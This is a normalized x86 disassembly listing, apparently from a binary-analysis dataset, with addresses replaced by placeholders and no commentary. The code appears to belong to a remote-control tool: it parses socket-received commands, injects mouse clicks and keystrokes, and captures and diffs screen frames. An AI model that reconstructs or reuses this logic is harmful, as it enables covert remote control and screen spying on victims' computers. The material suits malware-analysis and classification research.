mov [ rw-data ] eax
jne r-xdata
sub_40aff0
sub esp 0x8f8
push ebx
mov ebx [ esp + 0x900 ]
push ebp
push esi
push edi
xor esi esi
lea eax [ esp + 0x58 ]
push 0x3b
push ebx
mov [ esp + 0x38 ] rw-data
mov [ esp + 0x3c ] rw-data
mov [ esp + 0x40 ] rw-data
mov [ esp + 0x44 ] rw-data
mov [ esp + 0x48 ] rw-data
mov [ esp + 0x4c ] rw-data
mov [ esp + 0x50 ] rw-data
mov [ esp + 0x54 ] rw-data
mov [ esp + 0x58 ] rw-data
mov [ esp + 0x5c ] rw-data
mov [ esp + 0x24 ] rw-data
mov [ esp + 0x28 ] rw-data
mov [ esp + 0x2c ] rw-data
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x34 ] rw-data
mov [ esp + 0xb4 ] esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] esi
call [ strchr@IAT ]
add esp 0x8
cmp eax esi
je r-xdata
mov edx [ esp + 0xac ]
test edx edx
mov [ esp + 0x14 ] edx
je r-xdata
sub eax ebx
mov ecx 0x14
mov ebp eax
xor eax eax
lea edi [ esp + 0xb0 ]
push ebp
[ edi ]
lea ecx [ esp + 0xb4 ]
push ebx
push ecx
stosb [ edi ]
call [ strncpy@IAT ]
sub esp 0x48
mov ecx 0x14
lea esi [ esp + 0x104 ]
mov edi esp
[ edi ] [ esi ]
mov edx [ esp + 0x68 ]
push edx
movsb [ edi ] [ esi ]
call sub_40ca30
mov [ esp + 0x6c ] eax
mov ecx 0x200
xor eax eax
lea edi [ esp + 0x15c ]
[ edi ]
stosb [ edi ]
lea edi [ ebx + ebp + 0x1 ]
or ecx 0xffffffff
xor eax eax
add esp 0x58
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x104 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x104 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax [ esp + 0x10 ]
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc eax
cmp eax 0x5
mov [ esp + 0x10 ] eax
[ edi ] [ esi ]
je r-xdata
lea eax [ esp + 0x58 ]
push eax
call sub_40ca80
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8f8
retn
xor edi edi
lea ebp [ esp + 0x30 ]
push 0x3b
push ebx
call [ strchr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi [ esp + edi * 4 + 0x30 ]
mov esi rw-data
mov eax edi
inc edi
add ebp 0x4
cmp edi 0xa
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ ebp ]
mov eax edx
xor edi edi
lea ebp [ esp + 0x1c ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ edx + 0x54 ]
push esi
call [ atof@IAT ]
mov esi [ esi + 0x54 ]
fstp [ esp + 0x20 ]
push esi
call [ atof@IAT ]
mov esi [ esi + 0x54 ]
fstp [ esp + 0x1c ]
push esi
call [ atoi@IAT ]
mov eax [ rw-data ]
add esp 0xc
dec eax
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fdivr [ r--data ]
fmul [ esp + 0x1c ]
call _ftol
mov ecx [ rw-data ]
mov esi eax
dec ecx
mov [ esp + 0x10 ] ecx
fild [ esp + 0x10 ]
fdivr [ r--data ]
fmul [ esp + 0x14 ]
call _ftol
cmp ebx 0x1
mov edi eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edi [ esp + edi * 4 + 0x1c ]
mov esi rw-data
mov eax edi
inc edi
add ebp 0x4
cmp edi 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
cmp ebx 0x2
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8001
call [ mouse_event@IAT ]
jmp r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ ebp ]
mov eax edx
mov ebp [ atoi@IAT ]
lea ebx [ esp + 0x24 ]
mov [ esp + 0x10 ] 0x3
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
cmp ebx 0x3
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8002
call [ mouse_event@IAT ]
jmp r-xdata
mov esi rw-data
mov eax edi
mov ebp 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
cmp ebx 0x4
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8004
call [ mouse_event@IAT ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi [ edx + 0x54 ]
mov esi [ atoi@IAT ]
push edi
call esi
mov edi [ edi + 0x54 ]
mov ebx eax
push edi
call esi
mov edi [ edi + 0x54 ]
push edi
call esi
mov edi [ edi + 0x54 ]
push edi
call esi
add esp 0x10
cmp ebp 0x1
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x10 ]
add ebx 0x4
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov esi rw-data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
cmp ebx 0x5
jne r-xdata
mov ebx [ mouse_event@IAT ]
push 0x0
push 0x0
push edi
push esi
push 0x8002
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8004
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8002
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8004
call ebx
jmp r-xdata
mov ebp [ esp + 0x10 ]
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
cmp ebp 0x2
jne r-xdata
push 0x0
push 0x0
push ebx
push ebx
call [ keybd_event@IAT ]
jmp r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
mov edi [ ebx ]
mov eax [ esp + 0x14 ]
mov esi edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
cmp ebx 0x6
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8020
call [ mouse_event@IAT ]
jmp r-xdata
test eax eax
mov ebp 0x2
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x0
push ebp
push ebx
push ebx
call [ keybd_event@IAT ]
jmp r-xdata
mov esi rw-data
mov eax edi
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x54 ]
push eax
mov [ esp + 0x18 ] eax
call ebp
add esp 0x4
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
cmp ebx 0x7
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8040
call [ mouse_event@IAT ]
jmp r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
cmp ebx 0x8
jne r-xdata
mov ebx [ mouse_event@IAT ]
push 0x0
push 0x0
push edi
push esi
push 0x8020
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8040
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8020
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8040
call ebx
jmp r-xdata
mov esi rw-data
mov eax edi
mov eax [ esp + 0x14 ]
mov esi [ eax + 0x54 ]
push esi
call ebp
mov [ rw-data ] eax
mov esi [ esi + 0x54 ]
push esi
mov [ esp + 0x1c ] esi
call ebp
mov ecx [ rw-data ]
mov [ rw-data ] eax
push ecx
call sub_40bbd0
mov edx [ rw-data ]
push edx
call sub_40b8e0
add esp 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
cmp ebx 0x9
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8008
call [ mouse_event@IAT ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x6
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
cmp ebx 0xa
jne r-xdata
push 0x0
push 0x0
push edi
push esi
push 0x8010
call [ mouse_event@IAT ]
jmp r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x54 ]
push eax
mov [ esp + 0x18 ] eax
call ebp
mov ecx [ rw-data ]
mov [ rw-data ] ax
push ecx
call sub_40bbd0
mov edx [ rw-data ]
push edx
call sub_40b8e0
add esp 0xc
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov ebx [ mouse_event@IAT ]
push 0x0
push 0x0
push edi
push esi
push 0x8008
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8010
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8008
call ebx
push 0x0
push 0x0
push edi
push esi
push 0x8010
call ebx
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x7
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
mov eax edi
mov ebx 0x9
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov ebx [ esp + 0x10 ]
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
test eax eax
mov ebx 0xa
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_40b8e0
sub esp 0xac
mov [ rw-data ] rw-data
push ebx
push ebp
push esi
xor esi esi
push edi
push esi
push esi
push esi
push rw-data
mov [ rw-data ] esi
call [ CreateDCA@IAT ]
mov edi [ GetDeviceCaps@IAT ]
push 0x8
push eax
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0xa
push eax
call edi
mov ebp [ rw-data ]
mov ebx eax
cmp ebp esi
mov [ rw-data ] ebx
jle r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x1c ] ecx
mov edi ecx
mov eax [ rw-data ]
cdq
idiv ebp
mov edi eax
mov [ esp + 0x1c ] edi
jmp r-xdata
cmp ebp esi
jle r-xdata
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov ecx [ rw-data ]
cmp ecx esi
jle r-xdata
cmp ebp ecx
mov [ esp + 0x14 ] ebp
jg r-xdata
cmp ecx esi
jle r-xdata
mov eax [ esp + 0x14 ]
xor ebp ebp
cmp eax esi
jle r-xdata
mov [ esp + 0x14 ] ecx
cmp ebp esi
mov [ esp + 0x18 ] esi
jle r-xdata
push esi
call [ GetDC@IAT ]
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
pop ebx
add esp 0xac
retn
xor edx edx
xor eax eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] eax
jmp r-xdata
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ rw-data ] esi
mov [ esp + 0xb8 ] esi
mov [ esp + 0xb4 ] esi
jle r-xdata
mov edx [ esp + 0x18 ]
add eax edi
inc edx
mov [ esp + 0x10 ] eax
cmp edx ebp
mov [ esp + 0x18 ] edx
jl r-xdata
lea ecx [ eax + edi ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ecx
xor ebp ebp
jmp r-xdata
mov [ esp + 0x28 ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] edi
mov [ esp + 0x30 ] eax
add eax edi
mov [ esp + 0x28 ] ebp
mov [ esp + 0x34 ] eax
jmp r-xdata
cmp ecx esi
mov [ esp + 0x14 ] esi
jle r-xdata
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x34 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x30 ] eax
lea eax [ ebx + ebp ]
push ecx
mov [ esp + 0xbc ] esi
mov [ esp + 0xb8 ] esi
mov [ esp + 0x30 ] edx
mov [ esp + 0x3c ] ebp
mov [ esp + 0x40 ] eax
call [ CreateCompatibleDC@IAT ]
mov edx [ rw-data ]
push ebx
mov esi eax
push edi
push edx
mov [ esp + 0xa4 ] esi
call [ CreateCompatibleBitmap@IAT ]
push eax
push esi
mov [ esp + 0xa4 ] eax
call [ SelectObject@IAT ]
mov eax [ rw-data ]
sub esp 0x94
mov ecx 0x25
lea esi [ esp + 0xbc ]
mov edi esp
push eax
[ edi ] [ esi ]
call sub_407520
mov ecx [ rw-data ]
mov [ rw-data ] eax
mov eax [ esp + 0xac ]
add esp 0x98
inc eax
add ebp ebx
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
mov [ esp + 0x2c ] esi
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] edx
add edx ebx
mov [ esp + 0x2c ] ebp
mov [ esp + 0x3c ] edx
jmp r-xdata
cmp ecx esi
jle r-xdata
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x20 ]
xor esi esi
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
mov ebp [ rw-data ]
xor esi esi
mov ecx [ rw-data ]
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
xor esi esi
xor esi esi
mov ecx [ rw-data ]
push ecx
call [ CreateCompatibleDC@IAT ]
mov edx [ rw-data ]
push ebx
mov esi eax
push edi
push edx
mov [ esp + 0xa4 ] esi
call [ CreateCompatibleBitmap@IAT ]
push eax
push esi
mov [ esp + 0xa4 ] eax
call [ SelectObject@IAT ]
mov eax [ rw-data ]
sub esp 0x94
mov ecx 0x25
lea esi [ esp + 0xbc ]
mov edi esp
push eax
[ edi ] [ esi ]
call sub_407520
mov ecx [ esp + 0xb4 ]
mov edx [ esp + 0xa8 ]
add edx ecx
mov ecx [ esp + 0xb0 ]
add esp 0x98
mov [ rw-data ] eax
mov eax [ esp + 0x14 ]
inc ebp
add ecx ebx
cmp ebp eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x18 ] ecx
jl r-xdata
sub_40bbd0
mov eax [ rw-data ]
push esi
mov esi [ DeleteDC@IAT ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
push rw-data
call sub_407620
add esp 0x4
pop esi
retn
sub_40bc00
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
push ebx
push esi
push edi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
push 0xcc0020
push ecx
mov ecx [ rw-data ]
push edx
mov edx [ eax + 0x14 ]
push ecx
mov ecx [ eax + 0xc ]
push edx
mov edx [ eax + 0x70 ]
xor ebx ebx
push ecx
push ebx
push ebx
push edx
call [ BitBlt@IAT ]
mov eax [ rw-data ]
mov edx [ eax + 0x74 ]
lea ecx [ eax + 0x2c ]
push ecx
push 0x18
push edx
call [ GetObjectA@IAT ]
mov eax [ rw-data ]
mov cx [ rw-data ]
mov [ eax + 0x3e ] cx
mov edx [ rw-data ]
mov [ edx + 0x44 ] 0x28
mov eax [ rw-data ]
mov ecx [ eax + 0x30 ]
mov [ eax + 0x48 ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0x34 ]
mov [ eax + 0x4c ] edx
mov eax [ rw-data ]
mov [ eax + 0x50 ] 0x1
mov eax [ rw-data ]
mov cx [ eax + 0x3e ]
imul cx [ eax + 0x3c ]
mov [ eax + 0x52 ] cx
mov edx [ rw-data ]
mov [ edx + 0x54 ] ebx
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
mov ecx [ rw-data ]
mov [ ecx + 0x5c ] ebx
mov edx [ rw-data ]
mov [ edx + 0x60 ] ebx
mov eax [ rw-data ]
mov edx 0x1
mov [ eax + 0x64 ] ebx
mov ecx [ rw-data ]
mov [ ecx + 0x68 ] ebx
mov eax [ rw-data ]
mov cl [ eax + 0x52 ]
shl edx cl
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x18 ] 0x100
jle r-xdata
mov ecx [ eax + 0x18 ]
lea edx [ ecx * 4 + 0x28 ]
mov [ eax + 0x20 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x8c ] ebx
jne r-xdata
mov [ eax + 0x18 ] ebx
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
push ebx
mov [ eax + 0x6c ] ecx
mov eax [ rw-data ]
mov ecx 0xa
mov edi [ eax + 0x6c ]
lea esi [ eax + 0x44 ]
[ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax + 0x6c ]
mov ecx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x74 ]
mov eax [ rw-data ]
push ebx
push ecx
push ebx
push edx
push eax
call [ GetDIBits@IAT ]
mov eax [ rw-data ]
mov ecx 0xa
mov esi [ eax + 0x6c ]
lea edi [ eax + 0x44 ]
[ edi ] [ esi ]
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
mov [ eax + 0x1c ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0x58 ]
mov esi [ eax + 0x20 ]
add esi edx
mov [ eax + 0x20 ] esi
mov eax [ rw-data ]
cmp [ eax + 0x8c ] ebx
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
call [ malloc@IAT ]
mov ecx [ rw-data ]
add esp 0x4
mov [ ecx + 0x78 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0x78 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x78 ]
push ebx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov esi [ eax + 0x44 ]
mov ecx [ eax + 0x6c ]
lea edx [ esi + edx * 4 ]
push ecx
add edx ecx
mov ecx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x74 ]
mov eax [ rw-data ]
push ecx
push ebx
push edx
push eax
call [ GetDIBits@IAT ]
mov eax [ rw-data ]
cmp [ eax + 0x8c ] ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x78 ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0x20 ]
mov eax [ eax + 0x78 ]
push edx
push eax
call [ realloc@IAT ]
mov ecx [ rw-data ]
add esp 0x8
mov [ ecx + 0x78 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x20 ]
mov edi [ malloc@IAT ]
push esi
call edi
mov ecx [ rw-data ]
push esi
mov [ ecx + 0x88 ] eax
call edi
mov edx [ rw-data ]
mov [ edx + 0x7c ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x7c ]
mov [ eax + 0x80 ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0x20 ]
mov ecx [ eax + 0x78 ]
push edx
mov edx [ eax + 0x88 ]
push ecx
push edx
call sub_40c9f0
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x78 ]
mov eax [ eax + 0x7c ]
push ecx
push edx
push eax
call sub_40c9f0
mov ecx [ rw-data ]
mov eax 0x1
add esp 0x20
mov [ ecx + 0x8c ] eax
mov edx [ rw-data ]
mov [ edx + 0x90 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
mov [ eax + 0x24 ] ecx
mov edx [ rw-data ]
mov [ edx + 0x28 ] ebx
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x1c ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x88 ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x78 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0xc ]
shr ecx 0x2
mov edx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
add esi edx
mov edi [ ebp - 0x10 ]
add edi edx
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ eax + 0x90 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x1c ]
sub ecx edx
mov edx [ eax + 0x80 ]
mov [ eax + 0x7c ] edx
mov eax [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x7c ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
shr ecx 0x2
mov edi [ ebp - 0x14 ]
mov esi [ ebp - 0x10 ]
add esi [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x90 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x90 ] ebx
je r-xdata
lodsd [ esi ]
sub eax [ edx ]
add edx 0x4
stosd [ edi ]
dec ecx
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x20 ]
mov ecx [ eax + 0x78 ]
push edx
mov edx [ eax + 0x88 ]
push ecx
push edx
call sub_40c9f0
mov eax [ rw-data ]
add esp 0xc
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x1c ]
sub ecx edx
pop edi
mov [ eax + 0x24 ] ecx
mov eax [ rw-data ]
pop esi
pop ebx
mov edx [ eax + 0x1c ]
mov [ eax + 0x28 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov esp ebp
pop ebp
retn
sub_40bfb0
sub esp 0x54
mov ecx 0x14
xor eax eax
push ebx
push ebp
push esi
push edi
lea edi [ esp + 0x10 ]
mov ebp [ sprintf@IAT ]
[ edi ]
stosb [ edi ]
mov eax [ rw-data ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
call ebp
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
mov esi [ esp + 0x74 ]
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x1c ]
push ecx
push edx
push esi
call sub_40c550
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x28 ]
mov ebx [ recv@IAT ]
[ edi ]
add esp 0x18
stosb [ edi ]
push 0x0
lea eax [ esp + 0x14 ]
push 0x51
push eax
push esi
call ebx
mov [ esp + eax + 0x10 ] 0x0
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
mov ecx [ rw-data ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
stosb [ edi ]
call ebp
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x1c ]
push ecx
push eax
push esi
call sub_40c550
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x28 ]
add esp 0x18
[ edi ]
push 0x0
lea ecx [ esp + 0x14 ]
push 0x51
push ecx
push esi
stosb [ edi ]
call ebx
pop edi
pop esi
mov [ esp + eax + 0x8 ] 0x0
pop ebp
pop ebx
add esp 0x54
retn
sub_40c090
mov eax 0x1468
call sub_40d2c0
mov eax [ rw-data ]
push ebx
push ebp
push esi
xor esi esi
push edi
test eax eax
mov [ esp + 0x18 ] esi
mov [ rw-data ] eax
je r-xdata
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x1c ]
push esi
[ edi ]
lea ecx [ esp + 0x20 ]
push rw-data
push ecx
stosb [ edi ]
call [ sprintf@IAT ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
mov ebx [ esp + 0x148c ]
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x28 ]
push ecx
push edx
push ebx
call sub_40c550
mov ecx 0x14
xor eax eax
lea edi [ esp + 0x34 ]
mov ebp [ recv@IAT ]
[ edi ]
add esp 0x18
stosb [ edi ]
push 0x0
lea eax [ esp + 0x20 ]
push 0x51
push eax
push ebx
call ebp
test esi esi
mov [ esp + eax + 0x1c ] 0x0
jle r-xdata
mov edi [ esp + 0x147c ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1468
retn
mov edx [ rw-data ]
test edx edx
mov [ rw-data ] edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
inc esi
mov eax [ edx + 0x90 ]
test eax eax
je r-xdata
push edi
call sub_40bc00
add esp 0x4
test eax eax
je r-xdata
mov [ esp + 0x18 ] esi
mov edx [ edx + 0x94 ]
test edx edx
mov [ rw-data ] edx
jne r-xdata
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x1
test eax eax
